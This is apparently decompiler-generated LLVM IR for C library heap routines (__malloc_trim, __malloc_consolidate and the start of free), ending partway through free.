define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8052b4f = load i32, i32* @edx, align 4
  store i32 %v0_8052b4f, i32* %ebp.global-to-local, align 4
  %v1_8052b51 = add i32 %v0_8052b4f, 860
  %v2_8052b51 = inttoptr i32 %v1_8052b51 to i32*
  %v3_8052b51 = load i32, i32* %v2_8052b51, align 4
  store i32 %v3_8052b51, i32* %ecx.global-to-local, align 4
  %v1_8052b57 = add i32 %v0_8052b4f, 44
  %v2_8052b57 = inttoptr i32 %v1_8052b57 to i32*
  %v3_8052b57 = load i32, i32* %v2_8052b57, align 4
  %v1_8052b5a = add i32 %v3_8052b57, 4
  %v2_8052b5a = inttoptr i32 %v1_8052b5a to i32*
  %v3_8052b5a = load i32, i32* %v2_8052b5a, align 4
  %v1_8052b5f = and i32 %v3_8052b5a, -4
  store i32 %v1_8052b5f, i32* @esi, align 4
  %v1_8052b66 = load i32, i32* @eax, align 4
  %v2_8052b62 = add i32 %v3_8052b51, -17
  %v3_8052b62 = add i32 %v2_8052b62, %v1_8052b5f
  %v2_8052b66 = sub i32 %v3_8052b62, %v1_8052b66
  %div = udiv i32 %v2_8052b66, %v3_8052b51
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_8052b6e = add i32 %div, -1
  %v4_8052b6f = mul i32 %v1_8052b6e, %v3_8052b51
  store i32 %v4_8052b6f, i32* @ebx, align 4
  %tmp9 = icmp slt i32 %v4_8052b6f, 1
  br i1 %tmp9, label %dec_label_pc_8052bbd, label %dec_label_pc_8052b76

dec_label_pc_8052b76:                             ; preds = %entry
  %v1_8052b78 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052b78, i32* %edi.global-to-local, align 4
  %v0_8052b7f = load i32, i32* @esi, align 4
  store i32 %v0_8052b7f, i32* %eax.global-to-local, align 4
  %v1_8052b81 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052b81 = add i32 %v1_8052b81, 44
  %v3_8052b81 = inttoptr i32 %v2_8052b81 to i32*
  %v4_8052b81 = load i32, i32* %v3_8052b81, align 4
  %v5_8052b81 = add i32 %v4_8052b81, %v0_8052b7f
  store i32 %v5_8052b81, i32* %eax.global-to-local, align 4
  %v12_8052b85 = icmp eq i32 %v1_8052b78, %v5_8052b81
  %v1_8052b87 = icmp eq i1 %v12_8052b85, false
  br i1 %v1_8052b87, label %dec_label_pc_8052bbd, label %dec_label_pc_8052b89

dec_label_pc_8052b89:                             ; preds = %dec_label_pc_8052b76
  %v1_8052b89 = sub i32 0, %v4_8052b6f
  store i32 %v1_8052b89, i32* @ebx, align 4
  %v1_8052b8c = call i32 @__GI_sbrk(i32 %v1_8052b89)
  store i32 %v1_8052b8c, i32* %eax.global-to-local, align 4
  %v1_8052b93 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052b93, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v10_8052b99 = icmp eq i32 %v1_8052b93, -1
  br i1 %v10_8052b99, label %dec_label_pc_8052bbd, label %dec_label_pc_8052b9f

dec_label_pc_8052b9f:                             ; preds = %dec_label_pc_8052b89
  %v0_8052b9f = load i32, i32* %edi.global-to-local, align 4
  %v2_8052ba1 = sub i32 %v0_8052b9f, %v1_8052b93
  %v12_8052ba1 = icmp eq i32 %v2_8052ba1, 0
  store i32 %v2_8052ba1, i32* %ecx.global-to-local, align 4
  br i1 %v12_8052ba1, label %dec_label_pc_8052bbd, label %dec_label_pc_8052ba5

dec_label_pc_8052ba5:                             ; preds = %dec_label_pc_8052b9f
  %v0_8052ba5 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052ba5 = add i32 %v0_8052ba5, 44
  %v2_8052ba5 = inttoptr i32 %v1_8052ba5 to i32*
  %v3_8052ba5 = load i32, i32* %v2_8052ba5, align 4
  store i32 %v3_8052ba5, i32* %eax.global-to-local, align 4
  %v1_8052ba8 = add i32 %v0_8052ba5, 872
  %v2_8052ba8 = inttoptr i32 %v1_8052ba8 to i32*
  %v3_8052ba8 = load i32, i32* %v2_8052ba8, align 4
  %v5_8052ba8 = sub i32 %v3_8052ba8, %v2_8052ba1
  store i32 %v5_8052ba8, i32* %v2_8052ba8, align 4
  %v0_8052bae = load i32, i32* @esi, align 4
  %v1_8052bae = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052bae = sub i32 %v0_8052bae, %v1_8052bae
  %v1_8052bb0 = or i32 %v2_8052bae, 1
  %v1_8052bb3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bb3 = add i32 %v1_8052bb3, 4
  %v3_8052bb3 = inttoptr i32 %v2_8052bb3 to i32*
  store i32 %v1_8052bb0, i32* %v3_8052bb3, align 4
  br label %dec_label_pc_8052bbf

dec_label_pc_8052bbd:                             ; preds = %dec_label_pc_8052b9f, %dec_label_pc_8052b89, %dec_label_pc_8052b76, %entry
  br label %dec_label_pc_8052bbf

dec_label_pc_8052bbf:                             ; preds = %dec_label_pc_8052ba5, %dec_label_pc_8052bbd
  %storemerge = phi i32 [ 1, %dec_label_pc_8052ba5 ], [ 0, %dec_label_pc_8052bbd ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052b93, { 1, 0, 2 }
  uselistorder i32 %v4_8052b6f, { 1, 2, 0 }
  uselistorder i32 %v3_8052b51, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8052bbf, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8052bc5 = load i32, i32* @ebp, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %tmp15, i32* @ebp, align 4
  %v2_8052bd5 = load i32, i32* %arg1, align 4
  store i32 %v2_8052bd5, i32* %eax.global-to-local, align 4
  %v1_8052bd8 = icmp eq i32 %v2_8052bd5, 0
  br i1 %v1_8052bd8, label %dec_label_pc_8052cd9.preheader, label %dec_label_pc_8052be0

dec_label_pc_8052cd9.preheader:                   ; preds = %entry
  %v4_8052cd924 = add i32 %tmp15, 52
  store i32 %v4_8052cd924, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  %v2_8052ce125 = add i32 %tmp15, 64
  %v3_8052ce126 = inttoptr i32 %v2_8052ce125 to i32*
  store i32 %v4_8052cd924, i32* %v3_8052ce126, align 4
  %v0_8052ce427 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ce428 = add i32 %v0_8052ce427, 8
  %v3_8052ce429 = inttoptr i32 %v2_8052ce428 to i32*
  store i32 %v0_8052ce427, i32* %v3_8052ce429, align 4
  %v0_8052ce930 = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge

dec_label_pc_8052be0:                             ; preds = %entry
  %v1_8052be0 = and i32 %v2_8052bd5, -3
  store i32 %v1_8052be0, i32* %eax.global-to-local, align 4
  %v1_8052be3 = add i32 %tmp15, 52
  store i32 %v1_8052be3, i32* %edx.global-to-local, align 4
  store i32 %v1_8052be0, i32* %arg1, align 4
  %v0_8052be9 = load i32, i32* @ebp, align 4
  %v1_8052be9 = add i32 %v0_8052be9, 4
  store i32 %v1_8052be9, i32* %ebx.global-to-local, align 4
  %v0_8052bec = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bec = udiv i32 %v0_8052bec, 8
  %v0_8052bef = load i32, i32* %edx.global-to-local, align 4
  %v2_8052bf7 = mul nuw i32 %v2_8052bec, 4
  %v3_8052bf7 = add i32 %v0_8052be9, -4
  %v4_8052bf7 = add i32 %v3_8052bf7, %v2_8052bf7
  store i32 %v4_8052bf7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052bff

dec_label_pc_8052bff:                             ; preds = %dec_label_pc_8052ccf, %dec_label_pc_8052be0
  %v0_8052c0d = phi i32 [ %v1_8052be9, %dec_label_pc_8052be0 ], [ %v4_8052ccf, %dec_label_pc_8052ccf ]
  store i32 %v0_8052c0d, i32* %eax.global-to-local, align 4
  %v1_8052c03 = inttoptr i32 %v0_8052c0d to i32*
  %v2_8052c03 = load i32, i32* %v1_8052c03, align 4
  store i32 %v2_8052c03, i32* @ecx, align 4
  %v1_8052c05 = icmp eq i32 %v2_8052c03, 0
  br i1 %v1_8052c05, label %dec_label_pc_8052cc5, label %dec_label_pc_8052c0d

dec_label_pc_8052c0d:                             ; preds = %dec_label_pc_8052bff
  store i32 0, i32* %v1_8052c03, align 4
  %v0_8052c13.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052c13

dec_label_pc_8052c13:                             ; preds = %dec_label_pc_8052cb9, %dec_label_pc_8052c0d
  %v0_8052c2f = phi i32 [ %v3_8052c16, %dec_label_pc_8052cb9 ], [ %v0_8052c13.pre, %dec_label_pc_8052c0d ]
  %v1_8052c13 = add i32 %v0_8052c2f, 4
  %v2_8052c13 = inttoptr i32 %v1_8052c13 to i32*
  %v3_8052c13 = load i32, i32* %v2_8052c13, align 4
  store i32 %v3_8052c13, i32* %eax.global-to-local, align 4
  %v1_8052c16 = add i32 %v0_8052c2f, 8
  %v2_8052c16 = inttoptr i32 %v1_8052c16 to i32*
  %v3_8052c16 = load i32, i32* %v2_8052c16, align 4
  %v1_8052c1f = and i32 %v3_8052c13, -2
  store i32 %v1_8052c1f, i32* %edi.global-to-local, align 4
  %v2_8052c22 = urem i32 %v3_8052c13, 2
  %v3_8052c22 = icmp eq i32 %v2_8052c22, 0
  %v2_8052c24 = add i32 %v1_8052c1f, %v0_8052c2f
  store i32 %v2_8052c24, i32* %edx.global-to-local, align 4
  %v1_8052c27 = add i32 %v2_8052c24, 4
  %v2_8052c27 = inttoptr i32 %v1_8052c27 to i32*
  %v3_8052c27 = load i32, i32* %v2_8052c27, align 4
  store i32 %v3_8052c27, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052c27, i32* %stack_var_-40, align 4
  %v1_8052c2d = icmp eq i1 %v3_8052c22, false
  br i1 %v1_8052c2d, label %dec_label_pc_8052c57, label %dec_label_pc_8052c2f

dec_label_pc_8052c2f:                             ; preds = %dec_label_pc_8052c13
  %v1_8052c2f = inttoptr i32 %v0_8052c2f to i32*
  %v2_8052c2f = load i32, i32* %v1_8052c2f, align 4
  %v5_8052c37 = sub i32 %v0_8052c2f, %v2_8052c2f
  store i32 %v5_8052c37, i32* %eax.global-to-local, align 4
  %v1_8052c3b = add i32 %v5_8052c37, 8
  %v2_8052c3b = inttoptr i32 %v1_8052c3b to i32*
  %v3_8052c3b = load i32, i32* %v2_8052c3b, align 4
  store i32 %v3_8052c3b, i32* %esi.global-to-local, align 4
  %v1_8052c3e = add i32 %v5_8052c37, 12
  %v2_8052c3e = inttoptr i32 %v1_8052c3e to i32*
  %v3_8052c3e = load i32, i32* %v2_8052c3e, align 4
  store i32 %v3_8052c3e, i32* %ebx.global-to-local, align 4
  %v1_8052c41 = add i32 %v3_8052c3b, 12
  %v2_8052c41 = inttoptr i32 %v1_8052c41 to i32*
  %v3_8052c41 = load i32, i32* %v2_8052c41, align 4
  store i32 %v3_8052c41, i32* @ecx, align 4
  %v12_8052c44 = icmp eq i32 %v3_8052c41, %v5_8052c37
  %v1_8052c46 = icmp eq i1 %v12_8052c44, false
  br i1 %v1_8052c46, label %dec_label_pc_8052c80, label %dec_label_pc_8052c48

dec_label_pc_8052c48:                             ; preds = %dec_label_pc_8052c2f
  %v1_8052c48 = add i32 %v3_8052c3e, 8
  %v2_8052c48 = inttoptr i32 %v1_8052c48 to i32*
  %v3_8052c48 = load i32, i32* %v2_8052c48, align 4
  %v15_8052c48 = icmp eq i32 %v3_8052c48, %v3_8052c41
  %v1_8052c4b = icmp eq i1 %v15_8052c48, false
  br i1 %v1_8052c4b, label %dec_label_pc_8052c80, label %dec_label_pc_8052c4d

dec_label_pc_8052c4d:                             ; preds = %dec_label_pc_8052c48
  %v5_8052c4d = add i32 %v2_8052c2f, %v1_8052c1f
  store i32 %v5_8052c4d, i32* %edi.global-to-local, align 4
  store i32 %v3_8052c3e, i32* %v2_8052c41, align 4
  %v0_8052c54 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c54 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052c54 = add i32 %v1_8052c54, 8
  %v3_8052c54 = inttoptr i32 %v2_8052c54 to i32*
  store i32 %v0_8052c54, i32* %v3_8052c54, align 4
  %v2_8052c57.pre = load i32, i32* %stack_var_-40, align 4
  %v0_8052c5d.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052c57

dec_label_pc_8052c57:                             ; preds = %dec_label_pc_8052c13, %dec_label_pc_8052c4d
  %v1_8052c66 = phi i32 [ %v2_8052c24, %dec_label_pc_8052c13 ], [ %v0_8052c5d.pre, %dec_label_pc_8052c4d ]
  %v2_8052c57 = phi i32 [ %v3_8052c27, %dec_label_pc_8052c13 ], [ %v2_8052c57.pre, %dec_label_pc_8052c4d ]
  %v1_8052c5a = and i32 %v2_8052c57, -4
  store i32 %v1_8052c5a, i32* %esi.global-to-local, align 4
  %v1_8052c5d = load i32, i32* @ebp, align 4
  %v2_8052c5d = add i32 %v1_8052c5d, 44
  %v3_8052c5d = inttoptr i32 %v2_8052c5d to i32*
  %v4_8052c5d = load i32, i32* %v3_8052c5d, align 4
  %v15_8052c5d = icmp eq i32 %v1_8052c66, %v4_8052c5d
  br i1 %v15_8052c5d, label %dec_label_pc_8052cad, label %dec_label_pc_8052c62

dec_label_pc_8052c62:                             ; preds = %dec_label_pc_8052c57
  %v2_8052c62 = add i32 %v1_8052c66, 4
  %v3_8052c62 = add i32 %v1_8052c5a, %v2_8052c62
  %v4_8052c62 = inttoptr i32 %v3_8052c62 to i32*
  %v5_8052c62 = load i32, i32* %v4_8052c62, align 4
  store i32 %v5_8052c62, i32* %eax.global-to-local, align 4
  %v3_8052c66 = inttoptr i32 %v2_8052c62 to i32*
  store i32 %v1_8052c5a, i32* %v3_8052c66, align 4
  %v0_8052c69 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c69 = urem i32 %v0_8052c69, 2
  %v2_8052c69 = icmp eq i32 %v1_8052c69, 0
  store i32 %v1_8052c69, i32* %eax.global-to-local, align 4
  %v1_8052c6e = icmp eq i1 %v2_8052c69, false
  br i1 %v1_8052c6e, label %dec_label_pc_8052c8d, label %dec_label_pc_8052c70

dec_label_pc_8052c70:                             ; preds = %dec_label_pc_8052c62
  %v0_8052c70 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052c70 = add i32 %v0_8052c70, 8
  %v2_8052c70 = inttoptr i32 %v1_8052c70 to i32*
  %v3_8052c70 = load i32, i32* %v2_8052c70, align 4
  store i32 %v3_8052c70, i32* %ebx.global-to-local, align 4
  %v1_8052c73 = add i32 %v0_8052c70, 12
  %v2_8052c73 = inttoptr i32 %v1_8052c73 to i32*
  %v3_8052c73 = load i32, i32* %v2_8052c73, align 4
  store i32 %v3_8052c73, i32* %eax.global-to-local, align 4
  %v1_8052c76 = add i32 %v3_8052c70, 12
  %v2_8052c76 = inttoptr i32 %v1_8052c76 to i32*
  %v3_8052c76 = load i32, i32* %v2_8052c76, align 4
  %v15_8052c76 = icmp eq i32 %v3_8052c76, %v0_8052c70
  %v1_8052c79 = icmp eq i1 %v15_8052c76, false
  br i1 %v1_8052c79, label %dec_label_pc_8052c80, label %dec_label_pc_8052c7b

dec_label_pc_8052c7b:                             ; preds = %dec_label_pc_8052c70
  %v1_8052c7b = add i32 %v3_8052c73, 8
  %v2_8052c7b = inttoptr i32 %v1_8052c7b to i32*
  %v3_8052c7b = load i32, i32* %v2_8052c7b, align 4
  %v15_8052c7b = icmp eq i32 %v3_8052c7b, %v0_8052c70
  br i1 %v15_8052c7b, label %dec_label_pc_8052c85, label %dec_label_pc_8052c80

dec_label_pc_8052c80:                             ; preds = %dec_label_pc_8052c7b, %dec_label_pc_8052c70, %dec_label_pc_8052c48, %dec_label_pc_8052c2f
  %v0_8052c80 = call i32 @abort()
  store i32 %v0_8052c80, i32* %eax.global-to-local, align 4
  %v1_8052c87.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052c85

dec_label_pc_8052c85:                             ; preds = %dec_label_pc_8052c7b, %dec_label_pc_8052c80
  %v1_8052c87 = phi i32 [ %v3_8052c70, %dec_label_pc_8052c7b ], [ %v1_8052c87.pre, %dec_label_pc_8052c80 ]
  %v0_8052c87 = phi i32 [ %v3_8052c73, %dec_label_pc_8052c7b ], [ %v0_8052c80, %dec_label_pc_8052c80 ]
  %v0_8052c85 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052c85 = load i32, i32* %esi.global-to-local, align 4
  %v2_8052c85 = add i32 %v1_8052c85, %v0_8052c85
  store i32 %v2_8052c85, i32* %edi.global-to-local, align 4
  %v2_8052c87 = add i32 %v1_8052c87, 12
  %v3_8052c87 = inttoptr i32 %v2_8052c87 to i32*
  store i32 %v0_8052c87, i32* %v3_8052c87, align 4
  %v0_8052c8a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c8a = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c8a = add i32 %v1_8052c8a, 8
  %v3_8052c8a = inttoptr i32 %v2_8052c8a to i32*
  store i32 %v0_8052c8a, i32* %v3_8052c8a, align 4
  br label %dec_label_pc_8052c8d

dec_label_pc_8052c8d:                             ; preds = %dec_label_pc_8052c62, %dec_label_pc_8052c85
  store i32 %v0_8052bef, i32* %ebx.global-to-local, align 4
  %v0_8052c91 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052c93 = or i32 %v0_8052c91, 1
  store i32 %v1_8052c93, i32* %eax.global-to-local, align 4
  %v1_8052c96 = load i32, i32* @ecx, align 4
  %v3_8052c96 = add i32 %v1_8052c96, %v0_8052c91
  %v4_8052c96 = inttoptr i32 %v3_8052c96 to i32*
  store i32 %v0_8052c91, i32* %v4_8052c96, align 4
  %v0_8052c99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c99 = add i32 %v0_8052c99, 8
  %v2_8052c99 = inttoptr i32 %v1_8052c99 to i32*
  %v3_8052c99 = load i32, i32* %v2_8052c99, align 4
  store i32 %v3_8052c99, i32* %edx.global-to-local, align 4
  %v0_8052c9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c9c = load i32, i32* @ecx, align 4
  %v2_8052c9c = add i32 %v1_8052c9c, 4
  %v3_8052c9c = inttoptr i32 %v2_8052c9c to i32*
  store i32 %v0_8052c9c, i32* %v3_8052c9c, align 4
  %v0_8052c9f = load i32, i32* @ecx, align 4
  %v1_8052c9f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052c9f = add i32 %v1_8052c9f, 8
  %v3_8052c9f = inttoptr i32 %v2_8052c9f to i32*
  store i32 %v0_8052c9f, i32* %v3_8052c9f, align 4
  %v0_8052ca2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052ca2 = load i32, i32* @ecx, align 4
  %v2_8052ca2 = add i32 %v1_8052ca2, 8
  %v3_8052ca2 = inttoptr i32 %v2_8052ca2 to i32*
  store i32 %v0_8052ca2, i32* %v3_8052ca2, align 4
  %v0_8052ca5 = load i32, i32* @ecx, align 4
  %v1_8052ca5 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052ca5 = add i32 %v1_8052ca5, 12
  %v3_8052ca5 = inttoptr i32 %v2_8052ca5 to i32*
  store i32 %v0_8052ca5, i32* %v3_8052ca5, align 4
  %v0_8052ca8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052ca8 = load i32, i32* @ecx, align 4
  %v2_8052ca8 = add i32 %v1_8052ca8, 12
  %v3_8052ca8 = inttoptr i32 %v2_8052ca8 to i32*
  store i32 %v0_8052ca8, i32* %v3_8052ca8, align 4
  br label %dec_label_pc_8052cb9

dec_label_pc_8052cad:                             ; preds = %dec_label_pc_8052c57
  %v0_8052cad = load i32, i32* %edi.global-to-local, align 4
  %v2_8052cad = add i32 %v0_8052cad, %v1_8052c5a
  store i32 %v2_8052cad, i32* %eax.global-to-local, align 4
  %v0_8052cb0 = load i32, i32* @ecx, align 4
  store i32 %v0_8052cb0, i32* %v3_8052c5d, align 4
  %v0_8052cb3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cb3 = or i32 %v0_8052cb3, 1
  store i32 %v1_8052cb3, i32* %eax.global-to-local, align 4
  %v1_8052cb6 = load i32, i32* @ecx, align 4
  %v2_8052cb6 = add i32 %v1_8052cb6, 4
  %v3_8052cb6 = inttoptr i32 %v2_8052cb6 to i32*
  store i32 %v1_8052cb3, i32* %v3_8052cb6, align 4
  br label %dec_label_pc_8052cb9

dec_label_pc_8052cb9:                             ; preds = %dec_label_pc_8052c8d, %dec_label_pc_8052cad
  store i32 %v3_8052c16, i32* @ecx, align 4
  %v1_8052cbd = icmp eq i32 %v3_8052c16, 0
  %v1_8052cbf = icmp eq i1 %v1_8052cbd, false
  br i1 %v1_8052cbf, label %dec_label_pc_8052c13, label %dec_label_pc_8052cc5

dec_label_pc_8052cc5:                             ; preds = %dec_label_pc_8052cb9, %dec_label_pc_8052bff
  store i32 %v4_8052bf7, i32* %eax.global-to-local, align 4
  %v15_8052cc9 = icmp eq i32 %v0_8052c0d, %v4_8052bf7
  br i1 %v15_8052cc9, label %dec_label_pc_8052d38.loopexit, label %dec_label_pc_8052ccf

dec_label_pc_8052ccf:                             ; preds = %dec_label_pc_8052cc5
  %v4_8052ccf = add i32 %v0_8052c0d, 4
  br label %dec_label_pc_8052bff

dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge: ; preds = %dec_label_pc_8052cd9.preheader, %dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge
  %v0_8052ce931 = phi i32 [ %v0_8052ce930, %dec_label_pc_8052cd9.preheader ], [ %v0_8052ce9, %dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge ]
  %v1_8052cd9.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_8052cd9 = mul i32 %v1_8052cd9.pre, 8
  %v3_8052cd9 = add i32 %v0_8052ce931, 44
  %v4_8052cd9 = add i32 %v3_8052cd9, %v2_8052cd9
  store i32 %v4_8052cd9, i32* %eax.global-to-local, align 4
  %v1_8052cdd = add i32 %v1_8052cd9.pre, 1
  store i32 %v1_8052cdd, i32* %edx.global-to-local, align 4
  %v2_8052ce1 = add i32 %v4_8052cd9, 12
  %v3_8052ce1 = inttoptr i32 %v2_8052ce1 to i32*
  store i32 %v4_8052cd9, i32* %v3_8052ce1, align 4
  %v0_8052ce4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ce4 = add i32 %v0_8052ce4, 8
  %v3_8052ce4 = inttoptr i32 %v2_8052ce4 to i32*
  store i32 %v0_8052ce4, i32* %v3_8052ce4, align 4
  %v7_8052ce7 = icmp sgt i32 %v1_8052cdd, 95
  %v0_8052ce9 = load i32, i32* @ebp, align 4
  br i1 %v7_8052ce7, label %dec_label_pc_8052ce9, label %dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge

dec_label_pc_8052ce9:                             ; preds = %dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge
  %v1_8052ce9 = inttoptr i32 %v0_8052ce9 to i32*
  %v2_8052ce9 = load i32, i32* %v1_8052ce9, align 4
  store i32 %v2_8052ce9, i32* %eax.global-to-local, align 4
  %v1_8052cec = add i32 %v0_8052ce9, 840
  %v2_8052cec = inttoptr i32 %v1_8052cec to i32*
  store i32 0, i32* %v2_8052cec, align 4
  %v0_8052cf6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cf6 = urem i32 %v0_8052cf6, 4
  store i32 %v1_8052cf6, i32* %eax.global-to-local, align 4
  %v0_8052cf9 = load i32, i32* @ebp, align 4
  %v1_8052cf9 = add i32 %v0_8052cf9, 852
  %v2_8052cf9 = inttoptr i32 %v1_8052cf9 to i32*
  store i32 65536, i32* %v2_8052cf9, align 4
  %v0_8052d03 = load i32, i32* @ebp, align 4
  %v1_8052d03 = add i32 %v0_8052d03, 864
  %v2_8052d03 = inttoptr i32 %v1_8052d03 to i32*
  %v3_8052d03 = load i32, i32* %v2_8052d03, align 4
  %v4_8052d03 = or i32 %v3_8052d03, 1
  store i32 %v4_8052d03, i32* %v2_8052d03, align 4
  %v0_8052d0a = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d0a = or i32 %v0_8052d0a, 72
  store i32 %v1_8052d0a, i32* %eax.global-to-local, align 4
  %v0_8052d0d = load i32, i32* @ebp, align 4
  %v1_8052d0d = add i32 %v0_8052d0d, 844
  %v2_8052d0d = inttoptr i32 %v1_8052d0d to i32*
  store i32 262144, i32* %v2_8052d0d, align 4
  %v0_8052d17 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d17 = load i32, i32* @ebp, align 4
  %v2_8052d17 = inttoptr i32 %v1_8052d17 to i32*
  store i32 %v0_8052d17, i32* %v2_8052d17, align 4
  %v0_8052d1a = load i32, i32* @ebp, align 4
  %v1_8052d1a = add i32 %v0_8052d1a, 52
  store i32 %v1_8052d1a, i32* %eax.global-to-local, align 4
  %v1_8052d1d = add i32 %v0_8052d1a, 836
  %v2_8052d1d = inttoptr i32 %v1_8052d1d to i32*
  store i32 262144, i32* %v2_8052d1d, align 4
  %v0_8052d27 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d27 = load i32, i32* @ebp, align 4
  %v2_8052d27 = add i32 %v1_8052d27, 44
  %v3_8052d27 = inttoptr i32 %v2_8052d27 to i32*
  store i32 %v0_8052d27, i32* %v3_8052d27, align 4
  store i32 30, i32* %stack_var_-44, align 4
  %v1_8052d2c = call i32 @sysconf(i32 30)
  store i32 %v1_8052d2c, i32* %eax.global-to-local, align 4
  %v1_8052d31 = load i32, i32* @ebp, align 4
  %v2_8052d31 = add i32 %v1_8052d31, 860
  %v3_8052d31 = inttoptr i32 %v2_8052d31 to i32*
  store i32 %v1_8052d2c, i32* %v3_8052d31, align 4
  %v2_8052d37 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8052d37, i32* @ecx, align 4
  %v0_8052d3f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d38

dec_label_pc_8052d38.loopexit:                    ; preds = %dec_label_pc_8052cc5
  br label %dec_label_pc_8052d38

dec_label_pc_8052d38:                             ; preds = %dec_label_pc_8052d38.loopexit, %dec_label_pc_8052ce9
  %v0_8052d3f = phi i32 [ %v4_8052bf7, %dec_label_pc_8052d38.loopexit ], [ %v0_8052d3f.pre, %dec_label_pc_8052ce9 ]
  store i32 %v0_8052bc5, i32* @ebp, align 4
  ret i32 %v0_8052d3f

; uselistorder directives
  uselistorder i32 %v0_8052ce4, { 1, 0 }
  uselistorder i32 %v0_8052c91, { 1, 0, 2 }
  uselistorder i32 %v1_8052c69, { 1, 0 }
  uselistorder i32 %v2_8052c62, { 1, 0 }
  uselistorder i32 %v1_8052c5a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052c66, { 1, 0 }
  uselistorder i32 %v3_8052c16, { 2, 1, 0 }
  uselistorder i32 %v0_8052c2f, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8052c0d, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8052bf7, { 1, 0, 2, 3 }
  uselistorder i32 %tmp15, { 2, 0, 1, 3 }
  uselistorder i32* %edx.global-to-local, { 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 0, 11 }
  uselistorder i32* %edi.global-to-local, { 4, 2, 0, 3, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8052cd9.dec_label_pc_8052cd9_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8052cb9, { 1, 0 }
  uselistorder label %dec_label_pc_8052c8d, { 1, 0 }
  uselistorder label %dec_label_pc_8052c85, { 1, 0 }
  uselistorder label %dec_label_pc_8052c57, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_8052d40 = load i32, i32* @ebp, align 4
  %v0_8052d41 = load i32, i32* @edi, align 4
  %v0_8052d42 = load i32, i32* @esi, align 4
  %v0_8052d43 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v1_8052d4b = icmp eq i32 %arg1, 0
  br i1 %v1_8052d4b, label %dec_label_pc_8052ec7, label %dec_label_pc_8052d53

dec_label_pc_8052d53:                             ; preds = %entry
  %v2_8052d5d = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052d5d, i32* %eax.global-to-local, align 4
  %v4_8052d62 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134559876, i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v4_8052d62, i32* %eax.global-to-local, align 4
